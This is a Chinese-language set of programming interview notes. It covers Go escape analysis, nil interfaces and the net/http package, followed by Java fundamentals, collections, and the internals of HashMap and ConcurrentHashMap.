当一个变量(或对象)在子程序中被分配时，一个指向变量的指针可能逃逸到其它执行线程中，或者去调用子程序。如果使用尾递归优化（通常在函数编程语言中是需要的），对象也可能逃逸到被调用的子程序中。 如果一个子程序分配一个对象并返回一个该对象的指针，该对象可能在程序中的任何一个地方被访问到——这样指针就成功“逃逸”了。

如果指针存储在全局变量或者其它数据结构中，它们也可能发生逃逸，这种情况是当前程序中的指针逃逸。 逃逸分析需要确定指针所有可以存储的地方，保证指针的生命周期只在当前进程或线程中。

导致内存逃逸的情况比较多，有些可能还是官方未能够实现精确的分析逃逸情况的 bug，通常来讲就是如果变量的作用域不会扩大并且其行为或者大小能够在编译的时候确定，一般情况下都是分配到栈上，否则就可能发生内存逃逸分配到堆上。

**内存逃逸的五种情况:**

1. 发送指针的指针或值包含了指针到`channel` 中，由于在编译阶段无法确定其作用域与传递的路径，所以一般都会逃逸到堆上分配。
2. slices 中的值是指针的指针或包含指针字段。一个例子是类似`[]*string` 的类型。这总是导致 slice 的逃逸。即使切片的底层存储数组仍可能位于堆栈上，数据的引用也会转移到堆中。
3. slice 由于 append 操作超出其容量，因此会导致 slice 重新分配。这种情况下，由于在编译时 slice 的初始大小的已知情况下，将会在栈上分配。如果 slice 的底层存储必须基于仅在运行时数据进行扩展，则它将分配在堆上。
4. 调用接口类型的方法。接口类型的方法调用是动态调度,实际使用的具体实现只能在运行时确定。考虑一个接口类型为 io.Reader 的变量 r。对 r.Read(b) 的调用将导致 r 的值和字节片b的后续转义并因此分配到堆上。
5. 尽管能够符合分配到栈的场景，但是其大小不能够在在编译时候确定的情况，也会分配到堆上.

有效的避免上述的五种逃逸的情况,就可以避免内存逃逸.

## Go函数返回局部变量的指针是否安全

在 Go 中是安全的，Go 编译器将会对每个局部变量进行逃逸分析。如果发现局部变量的作用域超出该函数，则不会将内存分配在栈上，而是分配在堆上

## Go中两个Nil可能不相等吗

Go中两个Nil可能不相等。

接口(interface) 是对非接口值(例如指针，struct等)的封装，内部实现包含 2 个字段，类型 T 和 值 V。一个接口等于 nil，当且仅当 T 和 V 处于 unset 状态（T=nil，V is unset）。

两个接口值比较时，会先比较 T，再比较 V。
接口值与非接口值比较时，会先将非接口值尝试转换为接口值，再比较。

```go
func main() {
	var p *int = nil
	var i interface{} = p
	fmt.Println(i == p) // true
	fmt.Println(p == nil) // true
	fmt.Println(i == nil) // false
}
```

这个例子中，将一个nil非接口值p赋值给接口i，此时,i的内部字段为(T=*int, V=nil)，i与p作比较时，将 p 转换为接口后再比较，因此 `i == p`，p 与 nil 比较，直接比较值，所以 `p == nil`。

但是当 i 与nil比较时，会将nil转换为接口(T=nil, V=nil),与i(T=*int, V=nil)不相等，因此 `i != nil`。因此 V 为 nil ，但 T 不为 nil 的接口不等于 nil。

## Go的Struct能不能比较

- 相同struct类型的可以比较
- 不同struct类型的不可以比较,编译都不过，类型不匹配

## Go中的http包的实现原理

Golang中http包中处理 HTTP 请求主要跟两个东西相关：ServeMux 和 Handler。

ServeMux 本质上是一个 HTTP 请求路由器（或者叫多路复用器，Multiplexor）。它把收到的请求与一组预先定义的 URL 路径列表做对比，然后在匹配到路径的时候调用关联的处理器（Handler）。

处理器（Handler）负责输出HTTP响应的头和正文。任何满足了http.Handler接口的对象都可作为一个处理器。通俗的说，对象只要有个如下签名的ServeHTTP方法即可：

```go
ServeHTTP(http.ResponseWriter, *http.Request)
```

Go 语言的 HTTP 包自带了几个函数用作常用处理器，比如 `FileServer`，`NotFoundHandler` 和 `RedirectHandler`。

应用示例:

```go
package main

import (
	"log"
	"net/http"
)

func main() {
	mux := http.NewServeMux()

	rh := http.RedirectHandler("http://www.baidu.com", 307)
	mux.Handle("/foo", rh)

	log.Println("Listening...")
	http.ListenAndServe(":3000", mux)
}
```

在这个应用示例中,首先在 main 函数中我们只用了 `http.NewServeMux` 函数来创建一个空的 `ServeMux`。 然后我们使用 `http.RedirectHandler` 函数创建了一个新的处理器，这个处理器会对收到的所有请求，都执行307重定向操作到 `http://www.baidu.com`。

接下来我们使用 `ServeMux.Handle` 函数将处理器注册到新创建的 `ServeMux`，所以它在 URL 路径 `/foo` 上收到所有的请求都交给这个处理器。 最后我们创建了一个新的服务器，并通过 `http.ListenAndServe` 函数监听所有进入的请求，通过传递刚才创建的 `ServeMux`来为请求去匹配对应处理器。

在浏览器中访问 `http://localhost:3000/foo`，你应该能发现请求已经成功的重定向了。

此刻你应该能注意到一些有意思的事情：`ListenAndServer` 的函数签名是 `ListenAndServe(addr string, handler Handler)`，但是第二个参数我们传递的是个 `ServeMux`。

通过这个例子我们就可以知道,`net/http`包在编写golang web应用中有很重要的作用，它主要提供了基于HTTP协议进行工作的client实现和server实现，可用于编写HTTP服务端和客户端。

# JAVA面试

## java语言优点

① 平台无关性，摆脱硬件束缚，"一次编写，到处运行"。

② 相对安全的内存管理和访问机制，避免大部分内存泄漏和指针越界。

③ 热点代码检测和运行时编译及优化，使程序随运行时间增长获得更高性能。

④ 完善的应用程序接口，支持第三方类库。

## java如何实现平台无关？

**JVM：** Java 编译器可生成与计算机体系结构无关的字节码指令，字节码文件不仅可以轻易地在任何机器上解释执行，还可以动态地转换成本地机器代码，转换是由 JVM 实现的，JVM 是平台相关的，屏蔽了不同操作系统的差异。

**语言规范：** 基本数据类型大小有明确规定，例如 int 永远为 32 位，而 C/C++ 中可能是 16 位、32 位，也可能是编译器开发商指定的其他大小。Java 中数值类型有固定字节数，二进制数据以固定格式存储和传输，字符串采用标准的 Unicode 格式存储。

## JDK 和 JRE 的区别？

**JDK：** Java Development Kit，开发工具包。提供了编译运行 Java 程序的各种工具，包括编译器、JRE 及常用类库，是 JAVA 核心。

**JRE：** Java Runtime Environment，运行时环境，运行 Java 程序的必要环境，包括 JVM、核心类库、核心配置工具。

## 什么是反射

在运行状态中，对于任意一个类都能知道它的所有属性和方法，对于任意一个对象都能调用它的任意方法和属性，这种动态获取信息及调用对象方法的功能称为反射。缺点是破坏了封装性以及泛型约束。反射是框架的核心，Spring 大量使用反射。

## 什么是注解？什么是元注解

**注解**是一种标记，使类或接口附加额外信息，帮助编译器和 JVM 完成一些特定功能，例如 `@Override` 标识一个方法是重写方法。

**元注解**是自定义注解的注解，例如：

`@Target`：约束作用位置，值是 ElementType 枚举常量，包括 METHOD 方法、VARIABLE 变量、TYPE 类/接口、PARAMETER 方法参数、CONSTRUCTORS 构造方法和 LOACL_VARIABLE 局部变量等。

`@Rentention`：约束生命周期，值是 RetentionPolicy 枚举常量，包括 SOURCE 源码、CLASS 字节码和 RUNTIME 运行时。

`@Documented`：表明这个注解应该被 javadoc 记录。

## 泛型擦除是什么

泛型用于编译阶段，编译后的字节码文件不包含泛型类型信息，因为虚拟机没有泛型类型对象，所有对象都属于普通类。例如定义 `List<Object>` 或 `List<String>`，在编译后都会变成 `List` 。

定义一个泛型类型，会自动提供一个对应原始类型，类型变量会被擦除。如果没有限定类型就会替换为 Object，如果有限定类型就会替换为第一个限定类型，例如 `<T extends A & B>` 会使用 A 类型替换 T。

## jdk8的新特性

**lambda 表达式：**允许把函数作为参数传递到方法，简化匿名内部类代码。

**函数式接口：**使用 `@FunctionalInterface` 标识，有且仅有一个抽象方法，可被隐式转换为 lambda 表达式。

**方法引用：**可以引用已有类或对象的方法和构造方法，进一步简化 lambda 表达式。

**接口：**接口可以定义 `default` 修饰的默认方法，降低了接口升级的复杂性，还可以定义静态方法。

**注解：**引入重复注解机制，相同注解在同地方可以声明多次。注解作用范围也进行了扩展，可作用于局部变量、泛型、方法异常等。

**类型推测：**加强了类型推测机制，使代码更加简洁。

**Optional 类：**处理空指针异常，提高代码可读性。

**Stream 类：**引入函数式编程风格，提供了很多功能，使代码更加简洁。方法包括 `forEach` 遍历、`count` 统计个数、`filter` 按条件过滤、`limit` 取前 n 个元素、`skip` 跳过前 n 个元素、`map` 映射加工、`concat` 合并 stream 流等。

**日期：**增强了日期和时间 API，新的 java.time 包主要包含了处理日期、时间、日期/时间、时区、时刻和时钟等操作。

**JavaScript：**提供了一个新的 JavaScript 引擎，允许在 JVM上运行特定 JavaScript 应用。

## 异常的分类

所有异常都是 Throwable 的子类，分为 Error 和 Exception。**Error** 是 Java 运行时系统的内部错误和资源耗尽错误，例如 StackOverFlowError 和 OutOfMemoryError，这种异常程序无法处理。

**Exception** 分为受检异常和非受检异常，受检异常需要在代码中显式处理，否则会编译出错，非受检异常是运行时异常，继承自 RuntimeException。

**受检异常**：① 无能为力型，如字段超长导致的 SQLException。② 力所能及型，如未授权异常 UnAuthorizedException，程序可跳转权限申请页面。常见受检异常还有 FileNotFoundException、ClassNotFoundException、IOException等。

**非受检异常**：① 可预测异常，例如 IndexOutOfBoundsException、NullPointerException、ClassCastException 等，这类异常应该提前处理。② 需捕捉异常，例如进行 RPC 调用时的远程服务超时，这类异常客户端必须显式处理。③ 可透出异常，指框架或系统产生的且会自行处理的异常，例如 Spring 的 NoSuchRequestHandingMethodException，Spring 会自动完成异常处理，将异常自动映射到合适的状态码。

## java的数据类型

| 数据类型 | 内存大小                               | 默认值   | 取值范围                    |
| -------- | -------------------------------------- | -------- | --------------------------- |
| byte     | 1 B                                    | (byte)0  | -128 ~ 127                  |
| short    | 2 B                                    | (short)0 | -2^15^ ~ 2^15^-1            |
| int      | 4 B                                    | 0        | -2^31^ ~ 2^31^-1            |
| long     | 8 B                                    | 0L       | -2^63^ ~ 2^63^-1            |
| float    | 4 B                                    | 0.0F     | ±3.4E+38（有效位数 6~7 位） |
| double   | 8 B                                    | 0.0D     | ±1.7E+308（有效位数 15 位） |
| char     | 英文 1B，中文 UTF-8 占 3B，GBK 占 2B。 | '\u0000' | '\u0000' ~ '\uFFFF'         |
| boolean  | 单个变量 4B / 数组 1B                  | false    | true、false                 |

JVM 没有 boolean 赋值的专用字节码指令，`boolean f = false` 就是使用 ICONST_0 即常数 0 赋值。单个 boolean 变量用 int 代替，boolean 数组会编码成 byte 数组。

## 自动装箱/拆箱是什么？

每个基本数据类型都对应一个包装类，除了 int 和 char 对应 Integer 和 Character 外，其余基本数据类型的包装类都是首字母大写即可。

**自动装箱：** 将基本数据类型包装为一个包装类对象，例如向一个泛型为 Integer 的集合添加 int 元素。

**自动拆箱：** 将一个包装类对象转换为一个基本数据类型，例如将一个包装类对象赋值给一个基本数据类型的变量。

比较两个包装类数值要用 `equals` ，而不能用 `==` 。

## String是不可变类为啥值可以修改？

String 类和其存储数据的成员变量 value 字节数组都是 final 修饰的。对一个 String 对象的任何修改实际上都是创建一个新 String 对象，再引用该对象。只是修改 String 变量引用的对象，没有修改原 String 对象的内容。

## 字符串拼接的方式有哪些？

① 直接用 `+` ，底层用 StringBuilder 实现。只适用小数量，如果在循环中使用 `+` 拼接，相当于不断创建新的 StringBuilder 对象再转换成 String 对象，效率极差。

② 使用 String 的 concat 方法，该方法中使用 `Arrays.copyOf` 创建一个新的字符数组 buf 并将当前字符串 value 数组的值拷贝到 buf 中，buf 长度 = 当前字符串长度 + 拼接字符串长度。之后调用 `getChars` 方法使用 `System.arraycopy` 将拼接字符串的值也拷贝到 buf 数组，最后用 buf 作为构造参数 new 一个新的 String 对象返回。效率稍高于直接使用 `+`。

③ 使用 StringBuilder 或 StringBuffer，两者的 `append` 方法都继承自 AbstractStringBuilder，该方法首先使用 `Arrays.copyOf` 确定新的字符数组容量，再调用 `getChars` 方法使用 `System.arraycopy` 将新的值追加到数组中。StringBuilder 是 JDK5 引入的，效率高但线程不安全。StringBuffer 使用 synchronized 保证线程安全。

## String a = "a" + new String("b") 创建了几个对象？

常量和常量拼接仍是常量，结果在常量池，只要有变量参与拼接结果就是变量，存在堆。

使用字面量时只创建一个常量池中的常量，使用 new 时如果常量池中没有该值就会在常量池中新创建，再在堆中创建一个对象引用常量池中常量。因此 `String a = "a" + new String("b")` 会创建四个对象，常量池中的 a 和 b，堆中的 b 和堆中的 ab。

## 重载和重写的区别？

**重载**指方法名称相同，但参数类型个数不同，是行为水平方向不同实现。对编译器来说，方法名称和参数列表组成了一个唯一键，称为方法签名，JVM 通过方法签名决定调用哪种重载方法。不管继承关系如何复杂，重载在编译时可以根据规则知道调用哪种目标方法，因此属于静态绑定。

JVM 在重载方法中选择合适方法的顺序：① 精确匹配。② 基本数据类型自动转换成更大表示范围。③ 自动拆箱与装箱。④ 子类向上转型。⑤ 可变参数。

**重写**指子类实现接口或继承父类时，保持方法签名完全相同，实现不同方法体，是行为垂直方向不同实现。

元空间有一个方法表保存方法信息，如果子类重写了父类的方法，则方法表中的方法引用会指向子类实现。父类引用执行子类方法时无法调用子类存在而父类不存在的方法。

重写方法访问权限不能变小，返回类型和抛出的异常类型不能变大，必须加 `@Override` 。

## Object 类有哪些方法？

**equals：**检测对象是否相等，默认使用 `==` 比较对象引用，可以重写 equals 方法自定义比较规则。equals 方法规范：自反性、对称性、传递性、一致性、对于任何非空引用 x，`x.equals(null)` 返回 false。

**hashCode：**散列码是由对象导出的一个整型值，没有规律，每个对象都有默认散列码，值由对象存储地址得出。字符串散列码由内容导出，值可能相同。为了在集合中正确使用，一般需要同时重写 equals 和 hashCode，要求 equals 相同 hashCode 必须相同，hashCode 相同 equals 未必相同，因此 hashCode 是对象相等的必要不充分条件。

**toString**：打印对象时默认的方法，如果没有重写打印的是表示对象值的一个字符串。

**clone：**clone 方法声明为 protected，类只能通过该方法克隆它自己的对象，如果希望其他类也能调用该方法必须定义该方法为 public。如果一个对象的类没有实现 Cloneable 接口，该对象调用 clone 方***抛出一个 CloneNotSupport 异常。默认的 clone 方法是浅拷贝，一般重写 clone 方法需要实现 Cloneable 接口并指定访问修饰符为 public。

**finalize：**确定一个对象死亡至少要经过两次标记，如果对象在可达性分析后发现没有与 GC Roots 连接的引用链会被第一次标记，随后进行一次筛选，条件是对象是否有必要执行 finalize 方法。假如对象没有重写该方法或方法已被虚拟机调用，都视为没有必要执行。如果有必要执行，对象会被放置在 F-Queue 队列，由一条低调度优先级的 Finalizer 线程去执行。虚拟机会触发该方法但不保证会结束，这是为了防止某个对象的 finalize 方法执行缓慢或发生死循环。只要对象在 finalize 方法中重新与引用链上的对象建立关联就会在第二次标记时被移出回收集合。由于运行代价高昂且无法保证调用顺序，在 JDK 9 被标记为过时方法，并不适合释放资源。

**getClass：**返回包含对象信息的类对象。

**wait / notify / notifyAll：**阻塞或唤醒持有该对象锁的线程。

## 内部类的作用是什么，有哪些分类？

内部类是一个编译器现象，与虚拟机无关。编译器会把内部类转换成常规的类文件，用 $ 分隔外部类名与内部类名，其中匿名内部类使用数字编号，虚拟机对此一无所知。

**静态内部类：** 属于外部类，只加载一次。作用域仅在包内，可通过 `外部类名.内部类名` 直接访问，类内只能访问外部类所有静态属性和方法。HashMap 的 Node 节点，ReentrantLock 中的 Sync 类，ArrayList 的 SubList 都是静态内部类。内部类中还可以定义内部类，如 ThreadLoacl 静态内部类 ThreadLoaclMap 中定义了内部类 Entry。

**成员内部类：** 属于外部类的每个对象，随对象一起加载。不可以定义静态成员和方法，可访问外部类的所有内容。

**局部内部类：** 定义在方法内，不能声明访问修饰符，只能定义实例成员变量和实例方法，作用范围仅在声明类的代码块中。

**匿名内部类：** 只用一次的没有名字的类，可以简化代码，创建的对象类型相当于 new 的类的子类类型。用于实现事件监听和其他回调。

## 访问权限控制符有哪些？

| 访问权限控制符 | 本类 | 包内 | 包外子类 | 任何地方 |
| :------------: | :--: | :--: | :------: | :------: |
|     public     |  √   |  √   |    √     |    √     |
|   protected    |  √   |  √   |    √     |    ×     |
|       无       |  √   |  √   |    ×     |    ×     |
|    private     |  √   |  ×   |    ×     |    ×     |

## 子类初始化的顺序

① 父类静态代码块和静态变量。② 子类静态代码块和静态变量。③ 父类普通代码块和普通变量。④ 父类构造方法。⑤ 子类普通代码块和普通变量。⑥ 子类构造方法。

## 集合

### 说一说 ArrayList

**ArrayList** 是容量可变的非线程安全列表，使用数组实现，集合扩容时会创建更大的数组，把原有数组复制到新数组。支持对元素的快速随机访问，但插入与删除速度很慢。ArrayList 实现了 RandomAcess 标记接口，如果一个类实现了该接口，那么表示使用索引遍历比迭代器更快。

**elementData**是 ArrayList 的数据域，被 transient 修饰，序列化时会调用 writeObject 写入流，反序列化时调用 readObject 重新赋值到新对象的 elementData。原因是 elementData 容量通常大于实际存储元素的数量，所以只需发送真正有实际值的数组元素。

**size** 是当前实际大小，elementData 大小大于等于 size。

**modCount **记录了 ArrayList 结构性变化的次数，继承自 AbstractList。所有涉及结构变化的方法都会增加该值。expectedModCount 是迭代器初始化时记录的 modCount 值，每次访问新元素时都会检查 modCount 和 expectedModCount 是否相等，不相等就会抛出异常。这种机制叫做 fail-fast，所有集合类都有这种机制。

### 说一说LinkedList

**LinkedList** 本质是双向[链表]()，与 ArrayList 相比插入和删除速度更快，但随机访问元素很慢。除继承 AbstractList 外还实现了 Deque 接口，这个接口具有队列和栈的性质。成员变量被 transient 修饰，原理和 ArrayList 类似。

LinkedList 包含三个重要的成员：size、first 和 last。size 是双向[链表]()中节点的个数，first 和 last 分别指向首尾节点的引用。

LinkedList 的优点在于可以将零散的内存单元通过附加引用的方式关联起来，形成按链路顺序查找的线性结构，内存利用率较高。

### 线程安全的List

目前比较常用的构建线程安全的List有三种方法：

1. 使用Vector容器
2. 使用Collections的静态方法synchronizedList(List< T> list)
3. 采用CopyOnWriteArrayList容器

#### 1.使用Vector容器

Vector类实现了可扩展的对象数组，并且它是线程安全的。它和ArrayList在常用方法的实现上很相似，不同的只是它采用了同步关键词synchronized修饰方法。

#### 2. Collections.synchronizedList(List< T> list)

使用这种方法我们可以获得线程安全的List容器，它和Vector的区别在于它采用了同步代码块实现线程间的同步。通过分析源码，它的底层使用了新的容器包装原始的List。

#### 3. CopyOnWriteArrayList

顾名思义，它的意思就是在写操作的时候复制数组。为了将读取的性能发挥到极致，在该类的使用过程中，读读操作和读写操作都不互斥，这是一个很神奇的操作，接下来我们看看它如何实现。

```java
 public boolean add(E e) {
        final ReentrantLock lock = this.lock;
        lock.lock();
        try {
            Object[] elements = getArray();
            int len = elements.length;
            // 复制数组
            Object[] newElements = Arrays.copyOf(elements, len + 1);
            // 赋值
            newElements[len] = e;
            setArray(newElements);
            return true;
        } finally {
            lock.unlock();
        }
    }
```

从CopyOnWriteArrayList的add实现方式可以看出它是通过lock来实现线程间的同步的，这是一个标准的lock写法。那么它是怎么做到读写互斥的呢？

```java
// 复制数组
Object[] newElements = Arrays.copyOf(elements, len + 1);
// 赋值
newElements[len] = e;
```

真实实现读写互斥的细节就在这两行代码上。在面临写操作的时候，CopyOnWriteArrayList会先复制原来的数组并且在新数组上进行修改，最后再将原数组覆盖。如果写操作的过程中发生了线程切换，并且切换到读线程，因为此时数组并未发生覆盖，读操作读取的还是原数组。

换句话说，就是读操作和写操作位于不同的数组上，因此它们不会发生安全问题。

另外，数组定义private transient volatile Object[] array，其中采用volatile修饰，保证内存可见性，读取线程可以马上知道这个修改。

### ArrayList 的线程安全集合是什么？

可以使用 CopyOnWriteArrayList 代替 ArrayList，它实现了读写分离。写操作复制一个新的集合，在新集合内添加或删除元素，修改完成后再将原集合的引用指向新集合。这样做的好处是可以高并发地进行读写操作而不需要加锁，因为当前集合不会添加任何元素。使用时注意尽量设置容量初始值，并且可以使用批量添加或删除，避免多次扩容，比如只增加一个元素却复制整个集合。

适合读多写少，单个添加时效率极低。CopyOnWriteArrayList 是 fail-safe 的，并发包的集合都是这种机制，fail-safe 在安全的副本上遍历，集合修改与副本遍历没有任何关系，缺点是无法读取最新数据。这也是 CAP 理论中 C 和 A 的矛盾，即一致性与可用性的矛盾。

### Set 有什么特点，有哪些实现?

**Set** 不允许元素重复且无序，常用实现有 HashSet、LinkedHashSet 和 TreeSet。

**HashSet** 通过 HashMap 实现，HashMap 的 Key 即 HashSet 存储的元素，所有 Key 都使用相同的 Value ，一个名为 PRESENT 的 Object 类型常量。使用 Key 保证元素唯一性，但不保证有序性。由于 HashSet 是 HashMap 实现的，因此线程不安全。

HashSet 判断元素是否相同时，对于包装类型直接按值比较。对于引用类型先比较 hashCode 是否相同，不同则代表不是同一个对象，相同则继续比较 equals，都相同才是同一个对象。

**LinkedHashSet** 继承自 HashSet，通过 LinkedHashMap 实现，使用双向[链表]()维护元素插入顺序。

**TreeSet** 通过 TreeMap 实现的，添加元素到集合时按照比较规则将其插入合适的位置，保证插入后的集合仍然有序。

### TreeMap 有什么特点？

TreeMap 基于[红黑树]()实现，增删改查的平均和最差时间复杂度均为 O(log~~n~~) ，最大特点是 Key 有序。Key 必须实现 Comparable 接口或提供的 Comparator 比较器，所以 Key 不允许为 null。

HashMap 依靠 `hashCode` 和 `equals` 去重，而 TreeMap 依靠 Comparable 或 Comparator。 TreeMap [排序]()时，如果比较器不为空就会优先使用比较器的 `compare` 方法，否则使用 Key 实现的 Comparable 的 `compareTo` 方法，两者都不满足会抛出异常。

TreeMap 通过 `put` 和 `deleteEntry` 实现增加和删除树节点。插入新节点的规则有三个：① 需要调整的新节点总是红色的。② 如果插入新节点的父节点是黑色的，不需要调整。③ 如果插入新节点的父节点是红色的，由于[红黑树]()不能出现相邻红色，进入循环判断，通过重新着色或左右旋转来调整。TreeMap 的插入操作就是按照 Key 的对比往下遍历，大于节点值向右查找，小于向左查找，先按照二叉查找树的特性操作，后续会重新着色和旋转，保持[红黑树]()的特性。

### HashMap 有什么特点？

JDK8 之前底层实现是数组 + [链表]()，JDK8 改为数组 + [链表]()/[红黑树]()，节点类型从Entry 变更为 Node。主要成员变量包括存储数据的 table 数组、元素数量 size、加载因子 loadFactor。

table 数组记录 HashMap 的数据，每个下标对应一条[链表]()，所有哈希冲突的数据都会被存放到同一条[链表]()，Node/Entry 节点包含四个成员变量：key、value、next 指针和 hash 值。

HashMap 中数据以键值对的形式存在，键对应的 hash 值用来计算数组下标，如果两个元素 key 的 hash 值一样，就会发生哈希冲突，被放到同一个[链表]()上，为使查询效率尽可能高，键的 hash 值要尽可能分散。

HashMap 默认初始化容量为 16，扩容容量必须是 2 的幂次方、最大容量为 1<< 30 、默认加载因子为 0.75。

### HashMap 相关方法的源码？

**JDK8 之前**

**hash：计算元素 key 的散列值**

① 处理 String 类型时，调用 `stringHash32` 方法获取 hash 值。

② 处理其他类型数据时，提供一个相对于 HashMap 实例唯一不变的随机值 hashSeed 作为计算初始量。

③ 执行异或和无符号右移使 hash 值更加离散，减小哈希冲突概率。

**indexFor：计算元素下标**

将 hash 值和数组长度-1 进行与操作，保证结果不会超过 table 数组范围。

**get：获取元素的 value 值**

① 如果 key 为 null，调用 `getForNullKey` 方法，如果 size 为 0 表示[链表]()为空，返回 null。如果 size 不为 0 说明存在[链表]()，遍历 table[0] [链表]()，如果找到了 key 为 null 的节点则返回其 value，否则返回 null。

② 如果 key 为 不为 null，调用 `getEntry` 方法，如果 size 为 0 表示[链表]()为空，返回 null 值。如果 size 不为 0，首先计算 key 的 hash 值，然后遍历该[链表]()的所有节点，如果节点的 key 和 hash 值都和要查找的元素相同则返回其 Entry 节点。

③ 如果找到了对应的 Entry 节点，调用 `getValue` 方法获取其 value 并返回，否则返回 null。

**put：添加元素**

① 如果 key 为 null，直接存入 table[0]。

② 如果 key 不为 null，计算 key 的 hash 值。

③ 调用 `indexFor` 计算元素存放的下标 i。

④ 遍历 table[i] 对应的[链表]()，如果 key 已存在，就更新 value 然后返回旧 value。

⑤ 如果 key 不存在，将 modCount 值加 1，使用 `addEntry` 方法增加一个节点并返回 null。

**resize：扩容数组**

① 如果当前容量达到了最大容量，将阈值设置为 Integer 最大值，之后扩容不再触发。

② 否则计算新的容量，将阈值设为 `newCapacity x loadFactor` 和 `最大容量 + 1` 的较小值。

③ 创建一个容量为 newCapacity 的 Entry 数组，调用 `transfer` 方法将旧数组的元素转移到新数组。

**transfer：转移元素**

① 遍历旧数组的所有元素，调用 `rehash` 方法判断是否需要哈希重构，如果需要就重新计算元素 key 的 hash 值。

② 调用 `indexFor` 方法计算元素存放的下标 i，利用头插法将旧数组的元素转移到新数组。

**JDK8**

**hash：计算元素 key 的散列值**

如果 key 为 null 返回 0，否则就将 key 的 `hashCode` 方法返回值高低16位异或，让尽可能多的位参与运算，让结果的 0 和 1 分布更加均匀，降低哈希冲突概率。

**put：添加元素**

① 调用 `putVal` 方法添加元素。

② 如果 table 为空或长度为 0 就进行扩容，否则计算元素下标位置，不存在就调用 `newNode` 创建一个节点。

③ 如果存在且是[链表]()，如果首节点和待插入元素的 hash 和 key 都一样，更新节点的 value。

④ 如果首节点是 TreeNode 类型，调用 `putTreeVal` 方法增加一个树节点，每一次都比较插入节点和当前节点的大小，待插入节点小就往左子树查找，否则往右子树查找，找到空位后执行两个方法：`balanceInsert` 方法，插入节点并调整平衡、`moveRootToFront` 方法，由于调整平衡后根节点可能变化，需要重置根节点。

⑤ 如果都不满足，遍历[链表]()，根据 hash 和 key 判断是否重复，决定更新 value 还是新增节点。如果遍历到了[链表]()末尾则添加节点，如果达到建树阈值 7，还需要调用 `treeifyBin` 把[链表]()重构为[红黑树]()。

⑥ 存放元素后将 modCount 加 1，如果 `++size > threshold` ，调用 `resize` 扩容。

**get ：获取元素的 value 值**

① 调用 `getNode` 方法获取 Node 节点，如果不是 null 就返回其 value 值，否则返回 null。

② `getNode` 方法中如果数组不为空且存在元素，先比较第一个节点和要查找元素的 hash 和 key ，如果都相同则直接返回。

③ 如果第二个节点是 TreeNode 类型则调用 `getTreeNode` 方法进行查找，否则遍历[链表]()根据 hash 和 key 查找，如果没有找到就返回 null。

**resize：扩容数组**

重新规划长度和阈值，如果长度发生了变化，部分数据节点也要重新排列。

**重新规划长度**

① 如果当前容量 `oldCap > 0` 且达到最大容量，将阈值设为 Integer 最大值，return 终止扩容。

② 如果未达到最大容量，当 `oldCap << 1` 不超过最大容量就扩大为 2 倍。

③ 如果都不满足且当前扩容阈值 `oldThr > 0`，使用当前扩容阈值作为新容量。

④ 否则将新容量置为默认初始容量 16，新扩容阈值置为 12。

**重新排列数据节点**

① 如果节点为 null 不进行处理。

② 如果节点不为 null 且没有next节点，那么通过节点的 hash 值和 `新容量-1` 进行与运算计算下标存入新的 table 数组。

③ 如果节点为 TreeNode 类型，调用 `split` 方法处理，如果节点数 hc 达到6 会调用 `untreeify` 方法转回[链表]()。

④ 如果是[链表]()节点，需要将[链表]()拆分为 hash 值超出旧容量的[链表]()和未超出容量的[链表]()。对于`hash & oldCap == 0` 的部分不需要做处理，否则需要放到新的下标位置上，新下标 = 旧下标 + 旧容量。

### HashMap 为什么线程不安全？

JDK7 存在死循环和数据丢失问题。

**数据丢失：**

- **并发赋值被覆盖：** 在 `createEntry` 方法中，新添加的元素直接放在头部，使元素之后可以被更快访问，但如果两个线程同时执行到此处，会导致其中一个线程的赋值被覆盖。
- **已遍历区间新增元素丢失：** 当某个线程在 `transfer` 方法迁移时，其他线程新增的元素可能落在已遍历过的哈希槽上。遍历完成后，table 数组引用指向了 newTable，新增元素丢失。
- **新表被覆盖：** 如果 `resize` 完成，执行了 `table = newTable`，则后续元素就可以在新表上进行插入。但如果多线程同时 `resize` ，每个线程都会 new 一个数组，这是线程内的局部对象，线程之间不可见。迁移完成后`resize` 的线程会赋值给 table 线程共享变量，可能会覆盖其他线程的操作，在新表中插入的对象都会被丢弃。

**死循环：** 扩容时 `resize` 调用 `transfer` 使用头插法迁移元素，虽然 newTable 是局部变量，但原先 table 中的 Entry [链表]()是共享的，问题根源是 Entry 的 next 指针并发修改，某线程还没有将 table 设为 newTable 时用完了 CPU 时间片，导致数据丢失或死循环。

JDK8 在 `resize` 方法中完成扩容，并改用尾插法，不会产生死循环，但并发下仍可能丢失数据。可用 ConcurrentHashMap 或 `Collections.synchronizedMap` 包装成同步集合。

### JDK7 的 ConcurrentHashMap 原理？

ConcurrentHashMap 用于解决 HashMap 的线程不安全和 HashTable 的并发效率低，HashTable 之所以效率低是因为所有线程都必须竞争同一把锁，假如容器里有多把锁，每一把锁用于锁容器的部分数据，那么多线程访问容器不同数据段的数据时，线程间就不会存在锁竞争，从而有效提高并发效率，这就是 ConcurrentHashMap 的锁分段技术。首先将数据分成 Segment 数据段，然后给每一个数据段配一把锁，当一个线程占用锁访问其中一个段的数据时，其他段的数据也能被其他线程访问。

get 实现简单高效，先经过一次再散列，再用这个散列值通过散列运算定位到 Segment，最后通过散列[算法]()定位到元素。get 的高效在于不需要加锁，除非读到空值才会加锁重读。get 方法中将共享变量定义为 volatile，在 get 操作里只需要读所以不用加锁。

put 必须加锁，首先定位到 Segment，然后进行插入操作，第一步判断是否需要对 Segment 里的 HashEntry 数组进行扩容，第二步定位添加元素的位置，然后将其放入数组。

size 操作用于统计元素的数量，必须统计每个 Segment 的大小然后求和，在统计结果累加的过程中，之前累加过的 count 变化几率很小，因此先尝试两次通过不加锁的方式统计结果，如果统计过程中容器大小发生了变化，再加锁统计所有 Segment 大小。判断容器是否发生变化根据 modCount 确定。

### JDK8 的 ConcurrentHashMap 原理？

主要对 JDK7 做了三点改造：① 取消分段锁机制，进一步降低冲突概率。② 引入[红黑树]()结构，同一个哈希槽上的元素个数超过一定阈值后，单向[链表]()改为[红黑树]()结构。③ 使用了更加优化的方式统计集合内的元素数量。具体优化表现在：在 put、resize 和 size 方法中设计元素总数的更新和计算都避免了锁，使用 CAS 代替。

get 同样不需要同步，put 操作时如果没有出现哈希冲突，就使用 CAS 添加元素，否则使用 synchronized 加锁添加元素。

